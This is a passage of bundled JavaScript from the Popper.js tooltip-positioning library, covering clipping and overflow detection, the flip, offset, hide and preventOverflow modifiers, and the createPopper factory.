                    var win = getWindow(element);
                    var html = getDocumentElement(element);
                    var visualViewport = win.visualViewport;
                    var width = html.clientWidth;
                    var height = html.clientHeight;
                    var x = 0;
                    var y = 0;
                    if (visualViewport) {
                      width = visualViewport.width;
                      height = visualViewport.height;
                      var layoutViewport = isLayoutViewport();
                      if (layoutViewport || !layoutViewport && strategy === "fixed") {
                        x = visualViewport.offsetLeft;
                        y = visualViewport.offsetTop;
                      }
                    }
                    return {
                      width,
                      height,
                      x: x + getWindowScrollBarX(element),
                      y
                    };
                  }
                  ;
                  function getDocumentRect(element) {
                    var _element$ownerDocumen;
                    var html = getDocumentElement(element);
                    var winScroll = getWindowScroll(element);
                    var body = (_element$ownerDocumen = element.ownerDocument) == null ? void 0 : _element$ownerDocumen.body;
                    var width = math_max(html.scrollWidth, html.clientWidth, body ? body.scrollWidth : 0, body ? body.clientWidth : 0);
                    var height = math_max(html.scrollHeight, html.clientHeight, body ? body.scrollHeight : 0, body ? body.clientHeight : 0);
                    var x = -winScroll.scrollLeft + getWindowScrollBarX(element);
                    var y = -winScroll.scrollTop;
                    if (getComputedStyle2(body || html).direction === "rtl") {
                      x += math_max(html.clientWidth, body ? body.clientWidth : 0) - width;
                    }
                    return {
                      width,
                      height,
                      x,
                      y
                    };
                  }
                  ;
                  function isScrollParent(element) {
                    var _getComputedStyle = getComputedStyle2(element), overflow = _getComputedStyle.overflow, overflowX = _getComputedStyle.overflowX, overflowY = _getComputedStyle.overflowY;
                    return /auto|scroll|overlay|hidden/.test(overflow + overflowY + overflowX);
                  }
                  ;
                  function getScrollParent(node) {
                    if (["html", "body", "#document"].indexOf(getNodeName(node)) >= 0) {
                      return node.ownerDocument.body;
                    }
                    if (isHTMLElement(node) && isScrollParent(node)) {
                      return node;
                    }
                    return getScrollParent(getParentNode(node));
                  }
                  ;
                  function listScrollParents(element, list) {
                    var _element$ownerDocumen;
                    if (list === void 0) {
                      list = [];
                    }
                    var scrollParent = getScrollParent(element);
                    var isBody = scrollParent === ((_element$ownerDocumen = element.ownerDocument) == null ? void 0 : _element$ownerDocumen.body);
                    var win = getWindow(scrollParent);
                    var target = isBody ? [win].concat(win.visualViewport || [], isScrollParent(scrollParent) ? scrollParent : []) : scrollParent;
                    var updatedList = list.concat(target);
                    return isBody ? updatedList : (
                      // $FlowFixMe[incompatible-call]: isBody tells us target will be an HTMLElement here
                      updatedList.concat(listScrollParents(getParentNode(target)))
                    );
                  }
                  ;
                  function rectToClientRect(rect) {
                    return Object.assign({}, rect, {
                      left: rect.x,
                      top: rect.y,
                      right: rect.x + rect.width,
                      bottom: rect.y + rect.height
                    });
                  }
                  ;
                  function getInnerBoundingClientRect(element, strategy) {
                    var rect = getBoundingClientRect(element, false, strategy === "fixed");
                    rect.top = rect.top + element.clientTop;
                    rect.left = rect.left + element.clientLeft;
                    rect.bottom = rect.top + element.clientHeight;
                    rect.right = rect.left + element.clientWidth;
                    rect.width = element.clientWidth;
                    rect.height = element.clientHeight;
                    rect.x = rect.left;
                    rect.y = rect.top;
                    return rect;
                  }
                  function getClientRectFromMixedType(element, clippingParent, strategy) {
                    return clippingParent === viewport ? rectToClientRect(getViewportRect(element, strategy)) : isElement(clippingParent) ? getInnerBoundingClientRect(clippingParent, strategy) : rectToClientRect(getDocumentRect(getDocumentElement(element)));
                  }
                  function getClippingParents(element) {
                    var clippingParents2 = listScrollParents(getParentNode(element));
                    var canEscapeClipping = ["absolute", "fixed"].indexOf(getComputedStyle2(element).position) >= 0;
                    var clipperElement = canEscapeClipping && isHTMLElement(element) ? getOffsetParent(element) : element;
                    if (!isElement(clipperElement)) {
                      return [];
                    }
                    return clippingParents2.filter(function(clippingParent) {
                      return isElement(clippingParent) && contains(clippingParent, clipperElement) && getNodeName(clippingParent) !== "body";
                    });
                  }
                  function getClippingRect(element, boundary, rootBoundary, strategy) {
                    var mainClippingParents = boundary === "clippingParents" ? getClippingParents(element) : [].concat(boundary);
                    var clippingParents2 = [].concat(mainClippingParents, [rootBoundary]);
                    var firstClippingParent = clippingParents2[0];
                    var clippingRect = clippingParents2.reduce(function(accRect, clippingParent) {
                      var rect = getClientRectFromMixedType(element, clippingParent, strategy);
                      accRect.top = math_max(rect.top, accRect.top);
                      accRect.right = math_min(rect.right, accRect.right);
                      accRect.bottom = math_min(rect.bottom, accRect.bottom);
                      accRect.left = math_max(rect.left, accRect.left);
                      return accRect;
                    }, getClientRectFromMixedType(element, firstClippingParent, strategy));
                    clippingRect.width = clippingRect.right - clippingRect.left;
                    clippingRect.height = clippingRect.bottom - clippingRect.top;
                    clippingRect.x = clippingRect.left;
                    clippingRect.y = clippingRect.top;
                    return clippingRect;
                  }
                  ;
                  function computeOffsets(_ref) {
                    var reference2 = _ref.reference, element = _ref.element, placement = _ref.placement;
                    var basePlacement = placement ? getBasePlacement(placement) : null;
                    var variation = placement ? getVariation(placement) : null;
                    var commonX = reference2.x + reference2.width / 2 - element.width / 2;
                    var commonY = reference2.y + reference2.height / 2 - element.height / 2;
                    var offsets;
                    switch (basePlacement) {
                      case enums_top:
                        offsets = {
                          x: commonX,
                          y: reference2.y - element.height
                        };
                        break;
                      case bottom:
                        offsets = {
                          x: commonX,
                          y: reference2.y + reference2.height
                        };
                        break;
                      case right:
                        offsets = {
                          x: reference2.x + reference2.width,
                          y: commonY
                        };
                        break;
                      case left:
                        offsets = {
                          x: reference2.x - element.width,
                          y: commonY
                        };
                        break;
                      default:
                        offsets = {
                          x: reference2.x,
                          y: reference2.y
                        };
                    }
                    var mainAxis = basePlacement ? getMainAxisFromPlacement(basePlacement) : null;
                    if (mainAxis != null) {
                      var len = mainAxis === "y" ? "height" : "width";
                      switch (variation) {
                        case start2:
                          offsets[mainAxis] = offsets[mainAxis] - (reference2[len] / 2 - element[len] / 2);
                          break;
                        case end:
                          offsets[mainAxis] = offsets[mainAxis] + (reference2[len] / 2 - element[len] / 2);
                          break;
                        default:
                      }
                    }
                    return offsets;
                  }
                  ;
                  function detectOverflow(state, options) {
                    if (options === void 0) {
                      options = {};
                    }
                    var _options = options, _options$placement = _options.placement, placement = _options$placement === void 0 ? state.placement : _options$placement, _options$strategy = _options.strategy, strategy = _options$strategy === void 0 ? state.strategy : _options$strategy, _options$boundary = _options.boundary, boundary = _options$boundary === void 0 ? clippingParents : _options$boundary, _options$rootBoundary = _options.rootBoundary, rootBoundary = _options$rootBoundary === void 0 ? viewport : _options$rootBoundary, _options$elementConte = _options.elementContext, elementContext = _options$elementConte === void 0 ? popper : _options$elementConte, _options$altBoundary = _options.altBoundary, altBoundary = _options$altBoundary === void 0 ? false : _options$altBoundary, _options$padding = _options.padding, padding = _options$padding === void 0 ? 0 : _options$padding;
                    var paddingObject = mergePaddingObject(typeof padding !== "number" ? padding : expandToHashMap(padding, basePlacements));
                    var altContext = elementContext === popper ? reference : popper;
                    var popperRect = state.rects.popper;
                    var element = state.elements[altBoundary ? altContext : elementContext];
                    var clippingClientRect = getClippingRect(isElement(element) ? element : element.contextElement || getDocumentElement(state.elements.popper), boundary, rootBoundary, strategy);
                    var referenceClientRect = getBoundingClientRect(state.elements.reference);
                    var popperOffsets2 = computeOffsets({
                      reference: referenceClientRect,
                      element: popperRect,
                      strategy: "absolute",
                      placement
                    });
                    var popperClientRect = rectToClientRect(Object.assign({}, popperRect, popperOffsets2));
                    var elementClientRect = elementContext === popper ? popperClientRect : referenceClientRect;
                    var overflowOffsets = {
                      top: clippingClientRect.top - elementClientRect.top + paddingObject.top,
                      bottom: elementClientRect.bottom - clippingClientRect.bottom + paddingObject.bottom,
                      left: clippingClientRect.left - elementClientRect.left + paddingObject.left,
                      right: elementClientRect.right - clippingClientRect.right + paddingObject.right
                    };
                    var offsetData = state.modifiersData.offset;
                    if (elementContext === popper && offsetData) {
                      var offset2 = offsetData[placement];
                      Object.keys(overflowOffsets).forEach(function(key) {
                        var multiply = [right, bottom].indexOf(key) >= 0 ? 1 : -1;
                        var axis = [enums_top, bottom].indexOf(key) >= 0 ? "y" : "x";
                        overflowOffsets[key] += offset2[axis] * multiply;
                      });
                    }
                    return overflowOffsets;
                  }
                  ;
                  function computeAutoPlacement(state, options) {
                    if (options === void 0) {
                      options = {};
                    }
                    var _options = options, placement = _options.placement, boundary = _options.boundary, rootBoundary = _options.rootBoundary, padding = _options.padding, flipVariations = _options.flipVariations, _options$allowedAutoP = _options.allowedAutoPlacements, allowedAutoPlacements = _options$allowedAutoP === void 0 ? enums_placements : _options$allowedAutoP;
                    var variation = getVariation(placement);
                    var placements = variation ? flipVariations ? variationPlacements : variationPlacements.filter(function(placement2) {
                      return getVariation(placement2) === variation;
                    }) : basePlacements;
                    var allowedPlacements = placements.filter(function(placement2) {
                      return allowedAutoPlacements.indexOf(placement2) >= 0;
                    });
                    if (allowedPlacements.length === 0) {
                      allowedPlacements = placements;
                      if (false) {
                      }
                    }
                    var overflows = allowedPlacements.reduce(function(acc, placement2) {
                      acc[placement2] = detectOverflow(state, {
                        placement: placement2,
                        boundary,
                        rootBoundary,
                        padding
                      })[getBasePlacement(placement2)];
                      return acc;
                    }, {});
                    return Object.keys(overflows).sort(function(a, b) {
                      return overflows[a] - overflows[b];
                    });
                  }
                  ;
                  function getExpandedFallbackPlacements(placement) {
                    if (getBasePlacement(placement) === auto) {
                      return [];
                    }
                    var oppositePlacement = getOppositePlacement(placement);
                    return [getOppositeVariationPlacement(placement), oppositePlacement, getOppositeVariationPlacement(oppositePlacement)];
                  }
                  function flip(_ref) {
                    var state = _ref.state, options = _ref.options, name = _ref.name;
                    if (state.modifiersData[name]._skip) {
                      return;
                    }
                    var _options$mainAxis = options.mainAxis, checkMainAxis = _options$mainAxis === void 0 ? true : _options$mainAxis, _options$altAxis = options.altAxis, checkAltAxis = _options$altAxis === void 0 ? true : _options$altAxis, specifiedFallbackPlacements = options.fallbackPlacements, padding = options.padding, boundary = options.boundary, rootBoundary = options.rootBoundary, altBoundary = options.altBoundary, _options$flipVariatio = options.flipVariations, flipVariations = _options$flipVariatio === void 0 ? true : _options$flipVariatio, allowedAutoPlacements = options.allowedAutoPlacements;
                    var preferredPlacement = state.options.placement;
                    var basePlacement = getBasePlacement(preferredPlacement);
                    var isBasePlacement = basePlacement === preferredPlacement;
                    var fallbackPlacements = specifiedFallbackPlacements || (isBasePlacement || !flipVariations ? [getOppositePlacement(preferredPlacement)] : getExpandedFallbackPlacements(preferredPlacement));
                    var placements = [preferredPlacement].concat(fallbackPlacements).reduce(function(acc, placement2) {
                      return acc.concat(getBasePlacement(placement2) === auto ? computeAutoPlacement(state, {
                        placement: placement2,
                        boundary,
                        rootBoundary,
                        padding,
                        flipVariations,
                        allowedAutoPlacements
                      }) : placement2);
                    }, []);
                    var referenceRect = state.rects.reference;
                    var popperRect = state.rects.popper;
                    var checksMap = /* @__PURE__ */ new Map();
                    var makeFallbackChecks = true;
                    var firstFittingPlacement = placements[0];
                    for (var i = 0; i < placements.length; i++) {
                      var placement = placements[i];
                      var _basePlacement = getBasePlacement(placement);
                      var isStartVariation = getVariation(placement) === start2;
                      var isVertical = [enums_top, bottom].indexOf(_basePlacement) >= 0;
                      var len = isVertical ? "width" : "height";
                      var overflow = detectOverflow(state, {
                        placement,
                        boundary,
                        rootBoundary,
                        altBoundary,
                        padding
                      });
                      var mainVariationSide = isVertical ? isStartVariation ? right : left : isStartVariation ? bottom : enums_top;
                      if (referenceRect[len] > popperRect[len]) {
                        mainVariationSide = getOppositePlacement(mainVariationSide);
                      }
                      var altVariationSide = getOppositePlacement(mainVariationSide);
                      var checks = [];
                      if (checkMainAxis) {
                        checks.push(overflow[_basePlacement] <= 0);
                      }
                      if (checkAltAxis) {
                        checks.push(overflow[mainVariationSide] <= 0, overflow[altVariationSide] <= 0);
                      }
                      if (checks.every(function(check) {
                        return check;
                      })) {
                        firstFittingPlacement = placement;
                        makeFallbackChecks = false;
                        break;
                      }
                      checksMap.set(placement, checks);
                    }
                    if (makeFallbackChecks) {
                      var numberOfChecks = flipVariations ? 3 : 1;
                      var _loop = function _loop2(_i2) {
                        var fittingPlacement = placements.find(function(placement2) {
                          var checks2 = checksMap.get(placement2);
                          if (checks2) {
                            return checks2.slice(0, _i2).every(function(check) {
                              return check;
                            });
                          }
                        });
                        if (fittingPlacement) {
                          firstFittingPlacement = fittingPlacement;
                          return "break";
                        }
                      };
                      for (var _i = numberOfChecks; _i > 0; _i--) {
                        var _ret = _loop(_i);
                        if (_ret === "break")
                          break;
                      }
                    }
                    if (state.placement !== firstFittingPlacement) {
                      state.modifiersData[name]._skip = true;
                      state.placement = firstFittingPlacement;
                      state.reset = true;
                    }
                  }
                  var modifiers_flip = {
                    name: "flip",
                    enabled: true,
                    phase: "main",
                    fn: flip,
                    requiresIfExists: ["offset"],
                    data: {
                      _skip: false
                    }
                  };
                  ;
                  function getSideOffsets(overflow, rect, preventedOffsets) {
                    if (preventedOffsets === void 0) {
                      preventedOffsets = {
                        x: 0,
                        y: 0
                      };
                    }
                    return {
                      top: overflow.top - rect.height - preventedOffsets.y,
                      right: overflow.right - rect.width + preventedOffsets.x,
                      bottom: overflow.bottom - rect.height + preventedOffsets.y,
                      left: overflow.left - rect.width - preventedOffsets.x
                    };
                  }
                  function isAnySideFullyClipped(overflow) {
                    return [enums_top, right, bottom, left].some(function(side) {
                      return overflow[side] >= 0;
                    });
                  }
                  function hide(_ref) {
                    var state = _ref.state, name = _ref.name;
                    var referenceRect = state.rects.reference;
                    var popperRect = state.rects.popper;
                    var preventedOffsets = state.modifiersData.preventOverflow;
                    var referenceOverflow = detectOverflow(state, {
                      elementContext: "reference"
                    });
                    var popperAltOverflow = detectOverflow(state, {
                      altBoundary: true
                    });
                    var referenceClippingOffsets = getSideOffsets(referenceOverflow, referenceRect);
                    var popperEscapeOffsets = getSideOffsets(popperAltOverflow, popperRect, preventedOffsets);
                    var isReferenceHidden = isAnySideFullyClipped(referenceClippingOffsets);
                    var hasPopperEscaped = isAnySideFullyClipped(popperEscapeOffsets);
                    state.modifiersData[name] = {
                      referenceClippingOffsets,
                      popperEscapeOffsets,
                      isReferenceHidden,
                      hasPopperEscaped
                    };
                    state.attributes.popper = Object.assign({}, state.attributes.popper, {
                      "data-popper-reference-hidden": isReferenceHidden,
                      "data-popper-escaped": hasPopperEscaped
                    });
                  }
                  var modifiers_hide = {
                    name: "hide",
                    enabled: true,
                    phase: "main",
                    requiresIfExists: ["preventOverflow"],
                    fn: hide
                  };
                  ;
                  function distanceAndSkiddingToXY(placement, rects, offset2) {
                    var basePlacement = getBasePlacement(placement);
                    var invertDistance = [left, enums_top].indexOf(basePlacement) >= 0 ? -1 : 1;
                    var _ref = typeof offset2 === "function" ? offset2(Object.assign({}, rects, {
                      placement
                    })) : offset2, skidding = _ref[0], distance = _ref[1];
                    skidding = skidding || 0;
                    distance = (distance || 0) * invertDistance;
                    return [left, right].indexOf(basePlacement) >= 0 ? {
                      x: distance,
                      y: skidding
                    } : {
                      x: skidding,
                      y: distance
                    };
                  }
                  function offset(_ref2) {
                    var state = _ref2.state, options = _ref2.options, name = _ref2.name;
                    var _options$offset = options.offset, offset2 = _options$offset === void 0 ? [0, 0] : _options$offset;
                    var data = enums_placements.reduce(function(acc, placement) {
                      acc[placement] = distanceAndSkiddingToXY(placement, state.rects, offset2);
                      return acc;
                    }, {});
                    var _data$state$placement = data[state.placement], x = _data$state$placement.x, y = _data$state$placement.y;
                    if (state.modifiersData.popperOffsets != null) {
                      state.modifiersData.popperOffsets.x += x;
                      state.modifiersData.popperOffsets.y += y;
                    }
                    state.modifiersData[name] = data;
                  }
                  var modifiers_offset = {
                    name: "offset",
                    enabled: true,
                    phase: "main",
                    requires: ["popperOffsets"],
                    fn: offset
                  };
                  ;
                  function popperOffsets(_ref) {
                    var state = _ref.state, name = _ref.name;
                    state.modifiersData[name] = computeOffsets({
                      reference: state.rects.reference,
                      element: state.rects.popper,
                      strategy: "absolute",
                      placement: state.placement
                    });
                  }
                  var modifiers_popperOffsets = {
                    name: "popperOffsets",
                    enabled: true,
                    phase: "read",
                    fn: popperOffsets,
                    data: {}
                  };
                  ;
                  function getAltAxis(axis) {
                    return axis === "x" ? "y" : "x";
                  }
                  ;
                  function preventOverflow(_ref) {
                    var state = _ref.state, options = _ref.options, name = _ref.name;
                    var _options$mainAxis = options.mainAxis, checkMainAxis = _options$mainAxis === void 0 ? true : _options$mainAxis, _options$altAxis = options.altAxis, checkAltAxis = _options$altAxis === void 0 ? false : _options$altAxis, boundary = options.boundary, rootBoundary = options.rootBoundary, altBoundary = options.altBoundary, padding = options.padding, _options$tether = options.tether, tether = _options$tether === void 0 ? true : _options$tether, _options$tetherOffset = options.tetherOffset, tetherOffset = _options$tetherOffset === void 0 ? 0 : _options$tetherOffset;
                    var overflow = detectOverflow(state, {
                      boundary,
                      rootBoundary,
                      padding,
                      altBoundary
                    });
                    var basePlacement = getBasePlacement(state.placement);
                    var variation = getVariation(state.placement);
                    var isBasePlacement = !variation;
                    var mainAxis = getMainAxisFromPlacement(basePlacement);
                    var altAxis = getAltAxis(mainAxis);
                    var popperOffsets2 = state.modifiersData.popperOffsets;
                    var referenceRect = state.rects.reference;
                    var popperRect = state.rects.popper;
                    var tetherOffsetValue = typeof tetherOffset === "function" ? tetherOffset(Object.assign({}, state.rects, {
                      placement: state.placement
                    })) : tetherOffset;
                    var normalizedTetherOffsetValue = typeof tetherOffsetValue === "number" ? {
                      mainAxis: tetherOffsetValue,
                      altAxis: tetherOffsetValue
                    } : Object.assign({
                      mainAxis: 0,
                      altAxis: 0
                    }, tetherOffsetValue);
                    var offsetModifierState = state.modifiersData.offset ? state.modifiersData.offset[state.placement] : null;
                    var data = {
                      x: 0,
                      y: 0
                    };
                    if (!popperOffsets2) {
                      return;
                    }
                    if (checkMainAxis) {
                      var _offsetModifierState$;
                      var mainSide = mainAxis === "y" ? enums_top : left;
                      var altSide = mainAxis === "y" ? bottom : right;
                      var len = mainAxis === "y" ? "height" : "width";
                      var offset2 = popperOffsets2[mainAxis];
                      var min = offset2 + overflow[mainSide];
                      var max = offset2 - overflow[altSide];
                      var additive = tether ? -popperRect[len] / 2 : 0;
                      var minLen = variation === start2 ? referenceRect[len] : popperRect[len];
                      var maxLen = variation === start2 ? -popperRect[len] : -referenceRect[len];
                      var arrowElement = state.elements.arrow;
                      var arrowRect = tether && arrowElement ? getLayoutRect(arrowElement) : {
                        width: 0,
                        height: 0
                      };
                      var arrowPaddingObject = state.modifiersData["arrow#persistent"] ? state.modifiersData["arrow#persistent"].padding : getFreshSideObject();
                      var arrowPaddingMin = arrowPaddingObject[mainSide];
                      var arrowPaddingMax = arrowPaddingObject[altSide];
                      var arrowLen = within(0, referenceRect[len], arrowRect[len]);
                      var minOffset = isBasePlacement ? referenceRect[len] / 2 - additive - arrowLen - arrowPaddingMin - normalizedTetherOffsetValue.mainAxis : minLen - arrowLen - arrowPaddingMin - normalizedTetherOffsetValue.mainAxis;
                      var maxOffset = isBasePlacement ? -referenceRect[len] / 2 + additive + arrowLen + arrowPaddingMax + normalizedTetherOffsetValue.mainAxis : maxLen + arrowLen + arrowPaddingMax + normalizedTetherOffsetValue.mainAxis;
                      var arrowOffsetParent = state.elements.arrow && getOffsetParent(state.elements.arrow);
                      var clientOffset = arrowOffsetParent ? mainAxis === "y" ? arrowOffsetParent.clientTop || 0 : arrowOffsetParent.clientLeft || 0 : 0;
                      var offsetModifierValue = (_offsetModifierState$ = offsetModifierState == null ? void 0 : offsetModifierState[mainAxis]) != null ? _offsetModifierState$ : 0;
                      var tetherMin = offset2 + minOffset - offsetModifierValue - clientOffset;
                      var tetherMax = offset2 + maxOffset - offsetModifierValue;
                      var preventedOffset = within(tether ? math_min(min, tetherMin) : min, offset2, tether ? math_max(max, tetherMax) : max);
                      popperOffsets2[mainAxis] = preventedOffset;
                      data[mainAxis] = preventedOffset - offset2;
                    }
                    if (checkAltAxis) {
                      var _offsetModifierState$2;
                      var _mainSide = mainAxis === "x" ? enums_top : left;
                      var _altSide = mainAxis === "x" ? bottom : right;
                      var _offset = popperOffsets2[altAxis];
                      var _len = altAxis === "y" ? "height" : "width";
                      var _min = _offset + overflow[_mainSide];
                      var _max = _offset - overflow[_altSide];
                      var isOriginSide = [enums_top, left].indexOf(basePlacement) !== -1;
                      var _offsetModifierValue = (_offsetModifierState$2 = offsetModifierState == null ? void 0 : offsetModifierState[altAxis]) != null ? _offsetModifierState$2 : 0;
                      var _tetherMin = isOriginSide ? _min : _offset - referenceRect[_len] - popperRect[_len] - _offsetModifierValue + normalizedTetherOffsetValue.altAxis;
                      var _tetherMax = isOriginSide ? _offset + referenceRect[_len] + popperRect[_len] - _offsetModifierValue - normalizedTetherOffsetValue.altAxis : _max;
                      var _preventedOffset = tether && isOriginSide ? withinMaxClamp(_tetherMin, _offset, _tetherMax) : within(tether ? _tetherMin : _min, _offset, tether ? _tetherMax : _max);
                      popperOffsets2[altAxis] = _preventedOffset;
                      data[altAxis] = _preventedOffset - _offset;
                    }
                    state.modifiersData[name] = data;
                  }
                  var modifiers_preventOverflow = {
                    name: "preventOverflow",
                    enabled: true,
                    phase: "main",
                    fn: preventOverflow,
                    requiresIfExists: ["offset"]
                  };
                  ;
                  ;
                  function getHTMLElementScroll(element) {
                    return {
                      scrollLeft: element.scrollLeft,
                      scrollTop: element.scrollTop
                    };
                  }
                  ;
                  function getNodeScroll(node) {
                    if (node === getWindow(node) || !isHTMLElement(node)) {
                      return getWindowScroll(node);
                    } else {
                      return getHTMLElementScroll(node);
                    }
                  }
                  ;
                  function isElementScaled(element) {
                    var rect = element.getBoundingClientRect();
                    var scaleX = round(rect.width) / element.offsetWidth || 1;
                    var scaleY = round(rect.height) / element.offsetHeight || 1;
                    return scaleX !== 1 || scaleY !== 1;
                  }
                  function getCompositeRect(elementOrVirtualElement, offsetParent, isFixed) {
                    if (isFixed === void 0) {
                      isFixed = false;
                    }
                    var isOffsetParentAnElement = isHTMLElement(offsetParent);
                    var offsetParentIsScaled = isHTMLElement(offsetParent) && isElementScaled(offsetParent);
                    var documentElement = getDocumentElement(offsetParent);
                    var rect = getBoundingClientRect(elementOrVirtualElement, offsetParentIsScaled, isFixed);
                    var scroll = {
                      scrollLeft: 0,
                      scrollTop: 0
                    };
                    var offsets = {
                      x: 0,
                      y: 0
                    };
                    if (isOffsetParentAnElement || !isOffsetParentAnElement && !isFixed) {
                      if (getNodeName(offsetParent) !== "body" || // https://github.com/popperjs/popper-core/issues/1078
                      isScrollParent(documentElement)) {
                        scroll = getNodeScroll(offsetParent);
                      }
                      if (isHTMLElement(offsetParent)) {
                        offsets = getBoundingClientRect(offsetParent, true);
                        offsets.x += offsetParent.clientLeft;
                        offsets.y += offsetParent.clientTop;
                      } else if (documentElement) {
                        offsets.x = getWindowScrollBarX(documentElement);
                      }
                    }
                    return {
                      x: rect.left + scroll.scrollLeft - offsets.x,
                      y: rect.top + scroll.scrollTop - offsets.y,
                      width: rect.width,
                      height: rect.height
                    };
                  }
                  ;
                  function order(modifiers) {
                    var map = /* @__PURE__ */ new Map();
                    var visited = /* @__PURE__ */ new Set();
                    var result = [];
                    modifiers.forEach(function(modifier) {
                      map.set(modifier.name, modifier);
                    });
                    function sort(modifier) {
                      visited.add(modifier.name);
                      var requires = [].concat(modifier.requires || [], modifier.requiresIfExists || []);
                      requires.forEach(function(dep) {
                        if (!visited.has(dep)) {
                          var depModifier = map.get(dep);
                          if (depModifier) {
                            sort(depModifier);
                          }
                        }
                      });
                      result.push(modifier);
                    }
                    modifiers.forEach(function(modifier) {
                      if (!visited.has(modifier.name)) {
                        sort(modifier);
                      }
                    });
                    return result;
                  }
                  function orderModifiers(modifiers) {
                    var orderedModifiers = order(modifiers);
                    return modifierPhases.reduce(function(acc, phase) {
                      return acc.concat(orderedModifiers.filter(function(modifier) {
                        return modifier.phase === phase;
                      }));
                    }, []);
                  }
                  ;
                  function debounce(fn) {
                    var pending;
                    return function() {
                      if (!pending) {
                        pending = new Promise(function(resolve) {
                          Promise.resolve().then(function() {
                            pending = void 0;
                            resolve(fn());
                          });
                        });
                      }
                      return pending;
                    };
                  }
                  ;
                  function mergeByName(modifiers) {
                    var merged = modifiers.reduce(function(merged2, current) {
                      var existing = merged2[current.name];
                      merged2[current.name] = existing ? Object.assign({}, existing, current, {
                        options: Object.assign({}, existing.options, current.options),
                        data: Object.assign({}, existing.data, current.data)
                      }) : current;
                      return merged2;
                    }, {});
                    return Object.keys(merged).map(function(key) {
                      return merged[key];
                    });
                  }
                  ;
                  var INVALID_ELEMENT_ERROR = "Popper: Invalid reference or popper argument provided. They must be either a DOM element or virtual element.";
                  var INFINITE_LOOP_ERROR = "Popper: An infinite loop in the modifiers cycle has been detected! The cycle has been interrupted to prevent a browser crash.";
                  var DEFAULT_OPTIONS = {
                    placement: "bottom",
                    modifiers: [],
                    strategy: "absolute"
                  };
                  function areValidElements() {
                    for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
                      args[_key] = arguments[_key];
                    }
                    return !args.some(function(element) {
                      return !(element && typeof element.getBoundingClientRect === "function");
                    });
                  }
                  function popperGenerator(generatorOptions) {
                    if (generatorOptions === void 0) {
                      generatorOptions = {};
                    }
                    var _generatorOptions = generatorOptions, _generatorOptions$def = _generatorOptions.defaultModifiers, defaultModifiers2 = _generatorOptions$def === void 0 ? [] : _generatorOptions$def, _generatorOptions$def2 = _generatorOptions.defaultOptions, defaultOptions2 = _generatorOptions$def2 === void 0 ? DEFAULT_OPTIONS : _generatorOptions$def2;
                    return function createPopper2(reference2, popper2, options) {
                      if (options === void 0) {
                        options = defaultOptions2;
                      }
                      var state = {
                        placement: "bottom",
                        orderedModifiers: [],
                        options: Object.assign({}, DEFAULT_OPTIONS, defaultOptions2),
                        modifiersData: {},
                        elements: {
                          reference: reference2,
                          popper: popper2
                        },
                        attributes: {},
                        styles: {}
                      };
                      var effectCleanupFns = [];
                      var isDestroyed = false;
                      var instance = {
                        state,
                        setOptions: function setOptions(setOptionsAction) {
                          var options2 = typeof setOptionsAction === "function" ? setOptionsAction(state.options) : setOptionsAction;
                          cleanupModifierEffects();
                          state.options = Object.assign({}, defaultOptions2, state.options, options2);
                          state.scrollParents = {
                            reference: isElement(reference2) ? listScrollParents(reference2) : reference2.contextElement ? listScrollParents(reference2.contextElement) : [],
                            popper: listScrollParents(popper2)
                          };
                          var orderedModifiers = orderModifiers(mergeByName([].concat(defaultModifiers2, state.options.modifiers)));
                          state.orderedModifiers = orderedModifiers.filter(function(m) {
                            return m.enabled;
                          });
                          if (false) {
                            var _getComputedStyle, marginTop, marginRight, marginBottom, marginLeft, flipModifier, modifiers;
                          }
                          runModifierEffects();
                          return instance.update();
                        },
                        // Sync update – it will always be executed, even if not necessary. This
                        // is useful for low frequency updates where sync behavior simplifies the
                        // logic.
                        // For high frequency updates (e.g. `resize` and `scroll` events), always
                        // prefer the async Popper#update method
                        forceUpdate: function forceUpdate() {
                          if (isDestroyed) {
                            return;
                          }
                          var _state$elements = state.elements, reference3 = _state$elements.reference, popper3 = _state$elements.popper;
                          if (!areValidElements(reference3, popper3)) {
                            if (false) {
                            }
                            return;
                          }
                          state.rects = {
                            reference: getCompositeRect(reference3, getOffsetParent(popper3), state.options.strategy === "fixed"),
                            popper: getLayoutRect(popper3)
                          };
                          state.reset = false;
                          state.placement = state.options.placement;
                          state.orderedModifiers.forEach(function(modifier) {
                            return state.modifiersData[modifier.name] = Object.assign({}, modifier.data);
                          });
                          var __debug_loops__ = 0;
                          for (var index = 0; index < state.orderedModifiers.length; index++) {
                            if (false) {
                            }
                            if (state.reset === true) {
                              state.reset = false;
                              index = -1;
                              continue;
                            }
                            var _state$orderedModifie = state.orderedModifiers[index], fn = _state$orderedModifie.fn, _state$orderedModifie2 = _state$orderedModifie.options, _options = _state$orderedModifie2 === void 0 ? {} : _state$orderedModifie2, name = _state$orderedModifie.name;
                            if (typeof fn === "function") {
                              state = fn({
                                state,
                                options: _options,
                                name,
                                instance
                              }) || state;
                            }
                          }
                        },
                        // Async and optimistically optimized update – it will not be executed if
                        // not necessary (debounced to run at most once-per-tick)
                        update: debounce(function() {
                          return new Promise(function(resolve) {
                            instance.forceUpdate();
                            resolve(state);
                          });
                        }),
                        destroy: function destroy() {
                          cleanupModifierEffects();
                          isDestroyed = true;
                        }
                      };
                      if (!areValidElements(reference2, popper2)) {
                        if (false) {
                        }
                        return instance;
                      }
                      instance.setOptions(options).then(function(state2) {
                        if (!isDestroyed && options.onFirstUpdate) {
                          options.onFirstUpdate(state2);
                        }
                      });
                      function runModifierEffects() {
                        state.orderedModifiers.forEach(function(_ref3) {
                          var name = _ref3.name, _ref3$options = _ref3.options, options2 = _ref3$options === void 0 ? {} : _ref3$options, effect2 = _ref3.effect;
                          if (typeof effect2 === "function") {
                            var cleanupFn = effect2({
                              state,
                              name,
                              instance,
                              options: options2
                            });
                            var noopFn = function noopFn2() {
                            };
                            effectCleanupFns.push(cleanupFn || noopFn);
                          }
                        });
                      }
                      function cleanupModifierEffects() {
                        effectCleanupFns.forEach(function(fn) {
                          return fn();
                        });
                        effectCleanupFns = [];
                      }
                      return instance;
                    };
                  }
                  var createPopper = /* @__PURE__ */ popperGenerator();
                  ;
                  var defaultModifiers = [eventListeners, modifiers_popperOffsets, modifiers_computeStyles, modifiers_applyStyles, modifiers_offset, modifiers_flip, modifiers_preventOverflow, modifiers_arrow, modifiers_hide];
                  var popper_createPopper = /* @__PURE__ */ popperGenerator({
                    defaultModifiers
                  });
                  ;
                  var popper_lite_defaultModifiers = [eventListeners, modifiers_popperOffsets, modifiers_computeStyles, modifiers_applyStyles];
                  var popper_lite_createPopper = /* @__PURE__ */ popperGenerator({
